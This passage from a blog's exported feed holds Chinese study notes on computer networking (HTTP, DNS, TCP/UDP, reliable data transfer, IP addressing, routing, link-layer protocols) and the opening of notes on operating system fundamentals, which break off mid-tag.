title="Web和HTTP"></a>Web和HTTP</h2><ul><li><code>URL</code><ul><li>任何一个对象都可以用URL来定位</li><li>例子：<code>www.hust.edu.cn/cs/pic.gif</code></li></ul></li><li>持续连接与非持续连接<ul><li>非持续连接<ul><li>每个请求/响应对是经过一个单独的TCP连接发送</li></ul></li><li>持续连接<ul><li>非流水线方式<ul><li>一个对象传输完成方能传输下一个</li></ul></li><li>流水线方式<ul><li>可以一次性发送所有请求，慢慢接收</li></ul></li></ul></li></ul></li><li><code>cookie</code><ul><li><code>web</code>使用<code>cookie</code>的目的<ul><li>限制用户的身份</li><li>把内容与用户身份关联起来</li></ul></li><li><code>cookie</code>技术的组成部分<ul><li>在HTTP响应报文中有一个<code>cookie</code>首部行</li><li>在HTTP请求报文中有一个<code>cookie</code>首部行</li><li>在用户的端系统中保留了一个<code>cookie</code>文件，由用户浏览器负责管理</li><li>在<code>web</code>站点有一个后端数据库</li></ul></li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228221647835.png" alt="image-20211228221647835"></li></ul></li></ul><h2 id="DNS：因特网的目录服务"><a href="#DNS：因特网的目录服务" class="headerlink" title="DNS：因特网的目录服务"></a><code>DNS</code>：因特网的目录服务</h2><ul><li><p><code>DNS</code>系统，用于<code>IP</code>地址和域名之间的转换</p></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228221847533.png" alt="image-20211228221847533"></p></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228221826781.png" alt="image-20211228221826781"></p></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228221922645.png" alt="image-20211228221922645"></p></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228221931346.png" alt="image-20211228221931346"></p></li></ul><hr><h1 id="第三章-运输层（报文段）"><a href="#第三章-运输层（报文段）" class="headerlink" title="第三章 运输层（报文段）"></a>第三章 运输层（报文段）</h1><h2 id="概述与运输层服务"><a href="#概述与运输层服务" class="headerlink" title="概述与运输层服务"></a>概述与运输层服务</h2><ul><li>运输层的功能<ul><li>为不同主机上运行的应用程序之间提供逻辑通信</li></ul></li><li>运输层和网络层的区别<ul><li>网络层：不同主机间的逻辑通信</li><li>运输层：应用进程之间的逻辑通信</li></ul></li></ul><h2 id="多路复用和多路分解"><a href="#多路复用和多路分解" class="headerlink" title="多路复用和多路分解"></a>多路复用和多路分解</h2><ul><li>端口<ul><li>端口的作用就是让应用层的各种应用进程都能将其数据通过端口向下交付给运输层，以及让运输层知道应当将其报文段中的数据向上通过端口交付给应用层相应的进程。</li></ul></li><li>套接字、端口和<code>IP</code><ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228222740251-16407016614241.png" alt="image-20211228222740251"></li></ul></li><li><code>UDP</code>套接字由一个二元组标识<ul><li>包括一个目的<code>IP</code>地址和一个目的端口号</li><li>如果两个<code>UDP</code>报文段上述二元组相同，则通过同一个目的套接字被定向到相同的目的进程</li></ul></li><li><code>TCP</code>套接字由一个四元组标识<ul><li>(源<code>IP</code>地址，源端口号，目的<code>IP</code>地址，目的端口号)</li><li>接收方主机根据这四个值将报文段定向到相应的套接字</li><li><code>web</code>服务器为其每一个客户连接创建不同的套接字</li></ul></li></ul><h2 id="无连接传输：UDP"><a href="#无连接传输：UDP" class="headerlink" title="无连接传输：UDP"></a>无连接传输：<code>UDP</code></h2><ul><li>一个最简单的运输层协议必须提供<ul><li>多路复用/多路分解</li><li>差错检查</li></ul></li><li><code>UDP</code>处理数据的流程<ul><li>发送方<ul><li>从应用程序得到数据</li><li>附加上为多路复用/多路分解所需的源和目的端口号及差错检测信息，形成报文段</li><li>递交给网络层，尽力而为的交付给接收主机</li></ul></li><li>接收方<ul><li>从网络层接收报文段</li><li>根据目的端口号，将数据交付给相应的应用进程</li></ul></li></ul></li><li><code>UDP</code>的优势<ul><li>无需建立连接</li><li>简单</li><li>段首部开销小（<code>8Byte</code>）</li><li>无拥塞控制</li></ul></li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228223920354.png" alt="image-20211228223920354"></li><li><code>UDP</code>的检验和<ul><li>发送方<ul><li>把报文段看作是<code>16bit字</code>的序列</li><li>检验和：对报文段的所有<code>16bit字</code>的和进行反码运算（溢出回卷）</li><li>发送方将校验和写入<code>UDP</code>检验和字段中</li></ul></li><li>接收方<ul><li>计算接收到报文段的和</li><li>与发送方的检验和相加<ul><li>不全为1——检测出错</li><li>全为1——未检测到出错</li></ul></li></ul></li></ul></li></ul><h2 id="可靠数据传输的原理"><a href="#可靠数据传输的原理" class="headerlink" title="可靠数据传输的原理"></a>可靠数据传输的原理</h2><ul><li><p><code>rdt2.0</code></p><ul><li>假设<ul><li>分组比特可能受损</li><li>所有传输的分组都将按序被接收，不会丢失</li></ul></li><li>处理机制<ul><li>如如判断分组受损——差错检测（<code>ACK</code>和<code>NAK</code>）</li></ul></li></ul></li><li><p><code>rdt2.1</code></p><ul><li><p>问题引入</p><ul><li><code>ACK</code>和<code>NAK</code>的分组可能受损</li></ul></li><li><p>处理机制</p><ul><li><p>发送发重发——若收到被破坏的<code>ACK</code>或<code>NAK</code></p></li><li><p>为每一个数据报加上<strong>序号</strong></p></li><li><p>接收方收到重复序号则丢弃</p></li></ul></li></ul></li><li><p><code>rdt2.2</code></p><ul><li>改进<ul><li>只使用<code>ACK</code></li><li>取消<code>NAK</code>接收方对最后一个正确接收到的分组发送<code>ACK</code></li><li>发送方接收到重复的<code>ACK</code>将按照<code>NAK</code>处理</li></ul></li><li>停等协议<ul><li>发送方发送数据报之后等待接收方的响应</li></ul></li></ul></li><li><p><code>rdt3.0</code></p><ul><li>假设<ul><li>底层信道不但可能出错，而且可能会丢包</li></ul></li><li>处理机制<ul><li>丢包后重传</li><li>设置定时器</li></ul></li><li>性能低下<ul><li>停等操作</li></ul></li></ul></li><li><p>提高性能的方法——流水线技术</p><ul><li>允许发送方发送多个分组而无需等待确认<ul><li>增大序号范围（原来的0,1不够用）</li><li>发送方最低限度应当能缓存那些已发送但未被确认的分组</li><li>或许需要缓存那些已经正确接收的分组</li></ul></li><li>工作原理<ul><li>分组首部用k位<code>bit</code>字段表示序号</li><li>未被传输和已被传输但还未确认的分组的许可序号范围可以看作是一个在序号范围内大小为N的“窗口”</li></ul></li></ul></li><li><p>问题：当流水线技术中丢失一个分组后，如何进行重传</p><ul><li><code>Go-Back-N</code>协议：其后分组全部重传<ul><li>特点<ul><li><strong>累积确认</strong>——<code>ACK(n)</code>接收方对序号n之前包括n在内的所有分组进行确认</li><li><strong>一个定时器</strong>——从一次流水的最老分组开始计时</li><li><strong>超时</strong>——重传分组n和窗口中所有序号大于n的分组</li><li><strong>接收方无缓存</strong></li></ul></li><li>思考<ul><li>收到重复的分组怎么处理？</li><li>丢弃分组，重发<code>ACK</code></li><li>分组失序怎么办？</li><li>丢弃不缓存，重发按序到达的最高序号分组的<code>ACK</code></li></ul></li><li>发送端窗口<code>&lt;=</code> 2^k - 1</li></ul></li><li><code>SR</code>选择重传协议<ul><li>发送方<ul><li><strong>超时</strong>——为每个分组定义定时器，重传分组n，重置定时器</li><li>收到确认(n)在[<code>sendbase</code>,<code>sendbase+N</code>-1]范围内<ul><li>标记分组n为已接收</li><li>如果n是发送窗口基序号<code>sendbase</code>，则将窗口基序号前推倒下一个未确认序号</li><li>若窗口移动，新进入窗口的未发送分组会被发送</li></ul></li></ul></li><li>接收方<ul><li>分组序号n在[<code>rcvbase</code>,<code>rcvbase+N</code>-1]范围内<ul><li>发送n的确认<code>ACK</code></li><li>如果分组序号不连续：将其缓存</li><li>按序分组：将该分组以及缓存的序号连续的分组一起交付给上层，将窗口前推到下一个未收到的分组</li></ul></li><li>分组序号n在[<code>rcvbase</code>-N,<code>rcvbase</code>-1]范围内<ul><li>虽然确认过，仍再次发送<code>ACK</code></li></ul></li></ul></li><li>接收方窗口<code>&lt;=</code> 2^(k-1)</li></ul></li></ul></li></ul><h2 id="面向连接的传输：TCP"><a href="#面向连接的传输：TCP" class="headerlink" title="面向连接的传输：TCP"></a>面向连接的传输：<code>TCP</code></h2><ul><li><p><code>RTT</code>的估算</p><ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228232243824.png" alt="image-20211228232243824"></li><li>参考值<code>0.125</code></li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228232341455.png" alt="image-20211228232341455"></li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228232414379.png" alt="image-20211228232414379"></li></ul></li><li><p><code>TCP</code>的特别之处</p><ul><li><code>TCP</code>采用按字节编号，而非按报文段序号</li><li><code>TCP</code>仅采用唯一的定时器</li><li><strong>超时</strong>——重传认为超时的报文段，重启定时器</li><li>**收到<code>ACK</code>**——如果是对之前未确认的报文段确认，跟新<code>sendbase</code>，如果还有未被确认的报文段，<code>TCP</code>重启定时器</li><li><strong>累计确认</strong></li><li><strong>超时间隔加倍</strong><ul><li>每一次<code>TCP</code>重传均将下一次超时间隔设为先前值的两倍</li><li>超时间隔由<code>EstimatedRTT</code>和<code>DevRTT</code>决定</li><li>发生以下两个事件，超时间隔重新计算<ul><li>收到上层应用的数据</li><li>收到对未确认的数据的<code>ACK</code></li></ul></li></ul></li><li><strong>快速重传</strong><ul><li>超时周期往往太长——增加重发丢失分组的延时</li><li>通过重复的<code>ACK</code>来检测丢失报文段<ul><li>发送方常要连续的发送大量报文段</li><li>如果一个报文段丢失，会引起很多连读的重复<code>ACK</code></li></ul></li><li>如果发送方收到一个数据的**3个<code>ACK</code>**，他会认为确认数据之后的报文段丢失</li><li>在超时到来之前重传报文段<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228233915888.png" alt="image-20211228233915888"></li></ul></li></ul></li><li>产生<code>TCP ACK</code>的建议<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228233400620.png" alt="image-20211228233400620"></li></ul></li></ul></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228232921174.png" alt="image-20211228232921174"></p></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228232953609.png" alt="image-20211228232953609"></p></li><li><p>流量控制</p><ul><li><p>目标</p><ul><li>发送方不会由于传的太多太快而是的接收方缓存溢出</li></ul></li><li><p>手段</p><ul><li>接收方在反馈时，将缓冲区的剩余空间大小填充在报文段首部的窗口字段中，通知发送方</li></ul></li><li><p>窗口值的计算</p><ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228234101652.png" alt="image-20211228234101652"></li></ul></li><li><p>发送方持续向接收方发送只有一个字节数据的报文段，目的是试探</p></li></ul></li></ul><h2 id="拥塞控制原理"><a href="#拥塞控制原理" class="headerlink" title="拥塞控制原理"></a>拥塞控制原理</h2><h2 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h2><ul><li>拥塞窗口(<code>cwnd</code>)</li><li>发送方如何感知拥塞<ul><li>超时</li><li>三个冗余<code>ACK</code></li></ul></li><li>拥塞处理<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228234651088.png" alt="image-20211228234651088"></li><li>看题目</li></ul></li><li><code>TCP</code>的吞吐量<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228235133034.png" alt="image-20211228235133034"></li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228235145021.png" alt="image-20211228235145021"></li></ul></li></ul><hr><h1 id="第四章-网络层—数据平面（数据报）"><a href="#第四章-网络层—数据平面（数据报）" class="headerlink" title="第四章 网络层—数据平面（数据报）"></a>第四章 网络层—数据平面（数据报）</h1><h2 id="网络层概述"><a href="#网络层概述" class="headerlink" title="网络层概述"></a>网络层概述</h2><ul><li>网络层的目标<ul><li>实现主机到主机之间的通信</li></ul></li><li>网络层在计算机网络中的地位<ul><li>为运输层提供支持<ul><li>运输层实现进程到进程的通信</li><li>运输层功能的实现依赖于网络层提供的服务</li></ul></li></ul></li><li>网络层的主要功能<ul><li>在全局范畴为主机之间的通信进行选路，选路的结果反应为分组交换机的转发表</li><li>分组交换设备上的网络层根据 以及分组头部信息，将分组向适当链路进行转发</li></ul></li><li>分组交换机设备分类<ul><li>根据<strong>链路层首部信息</strong>进行转发的——链路层节点交换机</li><li>根据<strong>网络层首部信息</strong>进行转发的——路由器</li></ul></li></ul><h2 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h2><ul><li>最长前缀匹配<ul><li>查找给定目标地址的转发表项时，请使用与目标地址匹配的最长地址前缀</li></ul></li><li>输入端口排队<ul><li>输入端口的处理速率超过了交换结构的速率</li><li>线头阻塞：在输入队列中排队的分组必须等待通过交换结构发送，因为它被位于线头的另一个分组阻塞了</li><li>输入缓冲区溢出可能导致排队时延和丢包</li></ul></li><li>交换结构<ul><li>经内存交换</li><li>经总线交换</li><li>经内联网络交换</li></ul></li><li>输出端口<ul><li>交换结构将分组交付给输出端口的速率超过输出链路的速率</li></ul></li></ul><h2 id="网际协议：IPv4、寻址"><a href="#网际协议：IPv4、寻址" class="headerlink" title="网际协议：IPv4、寻址"></a>网际协议：<code>IPv4</code>、寻址</h2><ul><li><p><code>IP</code>分片和分组</p><ul><li>网络链路具有<code>MTU(最大传输单位)</code>属性——由链路层最大帧决定</li><li>不同类型的链路有不同的<code>MTU</code>值</li><li>大的<code>IP</code>数据报在网络中会被分为小的分片<ul><li>一个数据报变成了几个数据报</li><li>重组只在目的主机进行</li><li>数据报头部的<strong>标识、标志、片偏移、长度字段</strong>用于目的主机对接收的分片进行重组</li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229095807949.png" alt="image-20211229095807949"></li></ul></li></ul></li><li><p><code>IP</code>地址</p><ul><li><p>高位：网络号；低位：主机号</p></li><li><p><code>IP</code>地址的分类</p><ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229095919777.png" alt="image-20211229095919777"></li></ul></li><li><p>划分子网：从主机号中借一部分作为子网号</p><ul><li><p>子网掩码</p><ul><li>作用：对外隐藏子网的存在，对内指示网络号和子网号的位置</li><li>获得方法：通过在网络号的子网号相应的位置全置1，主机号相应的位置全置0，即可得到子网掩码</li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229100206074.png" alt="image-20211229100206074"></li></ul></li><li><p>网络地址</p><ul><li><strong><code>IP</code>地址</strong> AND <strong>子网掩码</strong> = <strong>网络地址</strong></li></ul></li><li><p>引入子网掩码后的寻址</p><ul><li><p>检查分组目的地址的<code>IP</code>地址的网络号</p><p>若网络号不是本网络，则从路由表中找出相应的转发节点地址将其转发出去</p></li><li><p>检查子网号</p><p>当网络号是本网络时，路由器将检查子网号，向相应的子网转发此分组</p></li></ul></li></ul></li><li><p><code>IP</code>地址的扩展——构造超网</p><ul><li>从网络号中借用一部分作为主机号</li></ul></li></ul></li><li><p><code>CIDR</code></p><ul><li>最长前缀匹配<ul><li>使用<code>CIDR</code>时，路由表中的每个项目由“网络前缀”和“下一跳地址”组成，在查找路由表时可能得到不止一个匹配结果</li><li>网络前缀越长，启迪之快就越小，因而路由越具体</li></ul></li></ul></li><li><p><code>DHCP</code>协议——动态主机配置协议</p><ul><li>工作在<strong>应用层</strong></li><li><code>IP</code>地址请求过程（全广播）<ul><li>主机广播“<code>DHCP</code>发现”报文</li><li><code>DHCP</code>服务器使用“<code>DHCP</code>提供”报文应答</li><li>主机使用“<code>DHCP</code>请求”报文请求<code>IP</code>地址</li><li><code>DHCP</code>服务器使用“<code>DHCP ACK</code> ”报文响应</li></ul></li><li><code>DHCP</code>除获取<code>IP</code>地址外，还能获取<strong>网关地址、<code>DNS</code>地址、子网掩码</strong></li></ul></li><li><p><code>NAT</code>协议</p><ul><li>动机：本地网络只需要使用一个<code>IP</code>地址就可以与外部网络相连</li><li>实现<ul><li>发送数据报：将每个外出报文的<strong>源<code>IP</code>地址，端口号</strong>替换为**<code>NAT IP</code>地址以及新的端口号**</li><li>记住每一个地址转换对</li><li>接收数据报：根据<code>NAT</code>转换表将每个进入报文的<code>NAT IP</code>地址，端口号替换为相应的源<code>IP</code>地址以及端口号</li></ul></li><li>三种地址转换方式<ul><li>静态<code>NAT</code></li><li>动态<code>NAT</code></li><li>端口<code>NAT</code></li></ul></li><li>属于<strong>网络层</strong>协议</li></ul></li><li><p><code>ICMP</code>：因特网控制报文协议</p><ul><li>用于主机、路由器、网关之间交换网络层信息<ul><li>错误报告：如住家、网络、端口、协议不可达等</li><li>回声请求/回答（用于<code>ping</code>程序）</li></ul></li><li>网络层协议</li></ul></li></ul><h1 id="第五章-网络层—控制平面"><a href="#第五章-网络层—控制平面" class="headerlink" title="第五章 网络层—控制平面"></a>第五章 网络层—控制平面</h1><h2 id="路由选择算法"><a href="#路由选择算法" class="headerlink" title="路由选择算法"></a>路由选择算法</h2><ul><li><p>几个概念</p><ul><li>默认路由器：一台主机“直接”连接到的路由器</li><li>源路由器：源主机的默认路由器</li><li>目的路由器：目的主机的默认路由器</li></ul></li><li><p>选路算法的目的</p><ul><li>给定一组路由器以及连接路由器的链路，从这找出一条从源路由器到目标路由器“好的”路径</li></ul></li><li><p>选路算法的分类</p><ul><li><p>根据信息是全局性的还是分散式的进行分类</p><ul><li><p>全局选路算法</p><p>所有路由器都知道整个网络拓扑图以及链路的费用信息</p><p><strong>链路状态算法</strong></p></li><li><p>分散式选路算法</p><p>每个路由器仅有与其相连链路的费用信息</p><p><strong>距离向量算法</strong></p></li></ul></li><li><p>根据信息是静态的还是动态的进行分类</p><ul><li><p>静态选路算法</p><p>随着时间的流逝，路由变换非常缓</p></li><li><p>动态选路算法</p><p>路由信息周期性的更新</p></li></ul></li><li><p>根据是否对负载敏感进行分类</p><ul><li>负载敏感算法</li><li>负载迟钝算法</li></ul></li></ul></li><li><p>迪杰斯特拉算法——链路状态算法</p><ul><li><code>OSPF</code>协议——链路状态协议<ul><li>使用迪杰斯特拉算法</li></ul></li><li>在哪一层有争议</li></ul></li><li><p>距离向量算法</p><ul><li>好消息传的快</li><li>坏消息传的慢</li></ul></li><li><p>层次路由</p><ul><li>将路由器聚合到一个区域——<strong>自治系统(<code>AS</code>)</strong><ul><li>在相同<code>AS</code>内的路由器可全部运行同样的选路算法</li><li>一般使用<code>OSPF</code>协议（或<code>RIP</code>协议）</li><li>在不同的<code>AS</code>内可以使用不同的选路算法</li></ul></li><li>转发表是由<code>AS</code>内部选路算法和<code>AS</code>间选路算法共同决定的<ul><li><code>AS</code>内部选路算法为内部目的地址设置转发表信息</li><li><code>AS</code>内部选路算法和<code>AS</code>间选路算法共同为外部目的地址设置转发表信息</li></ul></li><li>因特网上的<code>AS</code>内层次路由——层次<code>OSPF</code><ul><li>为了使<code>OSPF</code>能够用于规模很大的网络，<code>OSPF</code>将一个自制系统再划分为若干个更小的范围，叫做区域</li><li>划分区域的好处是将利用洪泛法交换链路信息的范围局限于每一个区域而不是整个自治系统，这就减少了整个网络上的通信量</li><li><code>OSPF</code>使用层次结构的区域划分，在上层的区域叫作主干区域</li></ul></li></ul></li><li><p>因特网上的<code>AS</code>间路由——<code>BGP(边界网关协议)</code></p><ul><li>每一个自治系统的管理员要选择至少一个路由作为该自治系统的“<code>BGP</code>发言人”</li><li>使用<code>TCP</code>，因此是<strong>应用层</strong>协议</li><li><code>BGP</code>路由通告<ul><li><code>AS2</code>可以聚合多个前缀为一个，并使用<code>BGP</code>向<code>AS1</code>通告单一前缀，则<code>AS2</code>承诺它将沿着朝向该前缀的路径，转发指向该前缀的任何数据报</li><li>当路由器通告一个前缀时，它随着前缀包含一些<code>BGP</code>属性</li><li>两个重要属性<ul><li><code>AS-PATH</code>：该属性包含了前缀的通告已经经过的那些<code>AS</code></li><li><code>NEXT-HOP</code>：指明到下一跳<code>AS</code>的具体的路由器</li></ul></li></ul></li><li><code>BGP</code>路由选择<ul><li>一台路由器可能知道一条前缀的多条路由路径，路由器必须在可能的路由中选择一条</li><li>消除规则<ul><li>本地偏好值</li><li>最短<code>AS-PATH</code>：在余下的路由中，具有最短<code>AS-PATH</code>的路由将被选择</li><li>从余下的路由中，选择具有最靠近<code>NEXT-HOP</code>路由器的路由：热土豆路由</li><li>如果仍余下多条路由，该路由器使用<code>BGP</code>标识以选择路由</li></ul></li></ul></li></ul></li></ul><h1 id="第六章-链路层和局域网"><a href="#第六章-链路层和局域网" class="headerlink" title="第六章 链路层和局域网"></a>第六章 链路层和局域网</h1><h2 id="链路层概述"><a href="#链路层概述" class="headerlink" title="链路层概述"></a>链路层概述</h2><ul><li>术语<ul><li>节点：主机和路由器</li><li>链路：沿着通信路径连接相邻节点的通信信道<ul><li>有线链路</li><li>无线链路</li></ul></li></ul></li><li>链路层的主要功能<ul><li>负责将数据报通过链路从一个节点传输到物理上相邻的节点</li></ul></li><li>链路层提供的服务<ul><li>成帧<ul><li>将数据加上头部和尾部，封装成数据帧</li><li>帧头部用<code>MAC</code>地址标识源和目的</li></ul></li><li>链路接入<ul><li>共享介质的信道访问</li></ul></li><li>可靠交付</li></ul></li><li>差错检测和纠正</li><li>流量控制</li><li>发送方和接收方<ul><li>发送方<ul><li>在一个帧内封装数据报</li><li>增加差错检测位，可靠交付，流量检测</li></ul></li><li>接收方<ul><li>查找错误，可靠交付，流量控制</li><li>取出数据报，交给网络层</li></ul></li></ul></li></ul><h2 id="差错检测和纠正技术"><a href="#差错检测和纠正技术" class="headerlink" title="差错检测和纠正技术"></a>差错检测和纠正技术</h2><ul><li>奇偶校验</li><li>因特网检查和</li><li>循环冗余校验码(<code>CRC</code>)<ul><li><code>D*2^r</code>除以<code>G</code>，得到余数<code>R</code></li></ul></li></ul><h2 id="多路访问链路和协议"><a href="#多路访问链路和协议" class="headerlink" title="多路访问链路和协议"></a>多路访问链路和协议</h2><ul><li><p>两种链路</p><ul><li>点到点链路<ul><li><code>PPP</code>、<code>HDLC</code></li></ul></li><li>广播链路（贡献链路或介质）<ul><li>传统以太网</li><li>802.11无线LAN</li><li><code>HFC</code></li></ul></li></ul></li><li><p>广播链路的特点</p><ul><li>单个共享广播信道</li><li>两个或多个节点同时传输：相互干扰</li></ul></li><li><p>多路访问协议</p><ul><li><p>信道划分协议：将信道划分成小的“片”</p><ul><li><code>TDMA</code><ul><li>循环访问信道，每个节点在每次循环中得到固定长度的时隙</li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229111057712.png" alt="image-20211229111057712"></li></ul></li><li><code>FDMA</code><ul><li>信道按频谱分成若干频段</li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229111137570.png" alt="image-20211229111137570"></li></ul></li></ul></li><li><p>随机接入协议：信道没有被划分，允许碰撞</p><ul><li><p>当节点有数据时</p><ul><li>以信道全部速率<code>R</code>传输</li><li>没有主节点起协调作用</li></ul></li><li><p>协议举例</p><ul><li>ALOHA、时隙ALOHA</li><li><code>CSMA</code>、<code>CSMA/CD</code>、<code>CSMA/CA</code></li></ul></li><li><p><code>CSMA</code></p><ul><li><p>非坚持<code>CSMA</code></p><p>一旦监听到信道忙就不再监听下去，而是根据协议的算法延迟一个随机的时间后重新再监听</p></li><li><p>时隙非坚持<code>CSMA</code></p><p>规定只能在每个时隙开始时传输帧</p></li><li><p>1坚持<code>CSMA</code></p><p>若信道正忙，则持续监听直到空闲</p></li><li><p>P坚持<code>CSMA</code></p></li></ul></li><li><p><code>CSMA/CD</code></p><ul><li><p>强化碰撞</p><p>当发送数据的站一旦发现了碰撞，除了立即停止发送外，还要继续发送若干比特的人为干扰信号</p><p>拥塞信号：<code>48bit</code></p></li><li><p><strong>争用期</strong></p><ul><li>最先发送数据帧的站，在发送数据帧后至多经过时间<code>2t</code>（两倍的端到端往返时延），就可以知道发送的数据帧是否遭受了碰撞</li><li>以太网端到端往返时延<code>2t</code>被称为争用期</li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229112733511.png" alt="image-20211229112733511"></li></ul></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229112122332.png" alt="image-20211229112122332"></p></li></ul></li></ul></li><li><p>轮流协议：节点轮流传送，但数据量大的节点轮流时间更长</p><ul><li>轮询协议</li><li>令牌传递协议</li></ul></li></ul></li></ul><h2 id="交换局域网"><a href="#交换局域网" class="headerlink" title="交换局域网"></a>交换局域网</h2><ul><li>链路层寻址和<code>ARP</code><ul><li><code>MAC</code>地址<ul><li>在数据链路层标识每块网络适配器，使得能够在广播信道上寻址目标节点</li><li><code>48bit</code></li></ul></li><li><code>ARP</code>协议<ul><li>根据目标的<code>IP</code>地址获取其<code>MAC</code>地址</li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229112548785.png" alt="image-20211229112548785"></li></ul></li></ul></li><li>信号编码<ul><li>曼彻斯特编码<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229112922234-16407485643571.png" alt="image-20211229112922234"></li></ul></li><li>差分曼彻斯特<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211229113027981.png" alt="image-20211229113027981"></li></ul></li></ul></li><li>交换机的自学习</li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ul><li>协议<ul><li><code>DCHP</code>——应用层，使用<code>UDP</code></li><li><code>BGP</code>——应用层，使用<code>TCP</code></li><li><code>ICMP</code>——网络层</li><li><code>ARP</code>——网络层</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>osNote</title>
      <link href="/2022/03/09/osNote/"/>
      <url>/2022/03/09/osNote/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h1><h2 id="操作系统的定义和特性"><a href="#操作系统的定义和特性" class="headerlink" title="操作系统的定义和特性"></a>操作系统的定义和特性</h2><ul><li>桌面常见的四大操作系统<ul><li><code>Windows</code>系统</li><li><code>Linux</code>系统<ul><li><code>RedHat</code>小红帽</li></ul></li><li><code>Mac</code>系统</li><li><code>Unix</code>系统</li></ul></li><li>没有安装操作系统的计算机能干什么<ul><li>无法继续启动</li><li>没有安装操作系统的计算机开机进入<code>DOS</code>界面，需要输入指令来进行操作，无法使用鼠标、键盘等，裸机启动过程分为三步（也就是会进入<code>BIOS</code>）：<ol><li>裸机上电后，会启动自检程序，自检程序会对硬件进行检测，判断计算机情况是否正常，若有问题则提示；</li><li>初始化操作，对一些外部设备进行初始化和检测；</li><li>引导程序，引导DOS</li></ol></li></ul></li><li>操作系统的基本功能<ul><li>提供操作界面</li><li>控制程序运行</li><li>管理系统资源</li><li>配置系统参数</li><li>监控系统状态</li><li>工具软件集合</li></ul></li><li>操作系统的定义<ul><li>操作系统是一个大型系统程序，它负责计算机系统软、硬件资源的分配；控制和协调并发活动；提供用户接口，使用户获得良好的工作环境</li><li>简而言之，管理并调度资源，为用户提供接口</li></ul></li><li>不同角度理解操作系统<ul><li>终端用户<ul><li>界面和命令</li></ul></li><li>应用程序员<ul><li>编程接口<code>API</code></li></ul></li><li>系统程序员<ul><li>管理和调度硬件资源</li><li>提供接口</li></ul></li></ul></li><li>操作系统的地位<ul><li><img src="/2022/03/09/osNote/image-20211231210548905.png" alt="image-20211231210548905"></li></ul></li><li>操作系统的特性（<strong>重点</strong>）<ul><li>并发性<ul><li>同时处理多个任务的能力</li></ul></li><li>共享性<ul><li>为多个并发任务提供资源共享</li></ul></li><li>不确定性<ul><li>具有处理随机事件的能力<ul><li>中断处理的能力</li><li>自动化能力</li></ul></li></ul></li></ul></li></ul><h2 id="操作系统的功能（重点）"><a href="#操作系统的功能（重点）" class="headerlink" title="操作系统的功能（重点）"></a>操作系统的功能（<strong>重点</strong>）</h2><ul><li>进程管理功能、存储管理功能、设备管理功能、文件管理功能</li><li>进程管理<ul><li>处理机分配</li><li><code>CPU</code>管理</li><li>处理机管理</li><li>多个程序如何共享<code>CPU</code></li><li>具体功能：<ul><li>进程控制：创建，暂停，唤醒，撤销</li><li>进程调度：调度策略，优先级</li><li>进程通信：进程间通信</li></ul></li></ul></li><li>存储管理<ul><li>为应用程序运行高效提供内存空间</li><li>支持多道程序设计</li><li>作用：<ul><li>内存分配</li><li>内存共享</li><li>内存保护</li><li>虚拟内存</li></ul></li></ul></li><li>设备管理<ul><li>提供统一的设备使用接口，管理设备分配和使用<ul><li>设备无关性</li><li>设备的传输控制</li><li>设备的驱动</li></ul></li></ul></li><li>文件管理<ul><li>文件和目录的管理</li><li>提供简便统一的信息存取和管理方法，解决信息共享、数据的存取控制等问题<ul><li>存储空间管理</li><li>文件的操作</li><li>目录的操作</li><li>文件和目录的存取权限管理</li></ul></li></ul></li></ul><h2 id="操作系统的性能"><a href="#操作系统的性能" class="headerlink" title="操作系统的性能"></a>操作系统的性能</h2><ul><li>吞吐率<ul><li>在单位时间内处理信息的能力</li></ul></li><li>响应能力<ul><li>从接收数据到输出结果的时间间隔</li></ul></li><li>资源利用率<ul><li>设备使用的频度</li></ul></li><li>可移植性<ul><li>改变硬件环境仍能正常工作的能力：代码修改量</li></ul></li><li>可靠性<ul><li>发现、诊断和恢复系统故障的能力</li></ul></li></ul><h2 id="操作系统的发展历史"><a href="#操作系统的发展历史" class="headerlink" 